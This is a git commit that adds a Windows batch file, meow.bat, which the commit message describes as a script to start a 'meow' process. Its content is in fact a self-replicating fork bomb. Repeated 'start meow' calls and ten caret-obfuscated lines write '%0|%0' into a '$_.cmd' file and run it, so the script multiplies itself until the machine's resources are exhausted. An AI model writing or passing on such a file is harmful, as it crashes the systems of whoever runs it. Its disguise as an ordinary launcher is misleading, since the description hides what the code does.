8729e0fbeb864e6804cc9a3e79874cd760dfb7ed
James101217 <105470172+James101217@users.noreply.github.com>
2025-11-26 17:28:09 +0800

    Add meow.bat to start the meow process
    Create a batch file to start 'meow' and execute commands.

---
+++ meow.bat
@@ -0,0 +1,12 @@
+start meow
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+@echo.%0^|%0>$^_^.c^md&$_>nul
+start meow
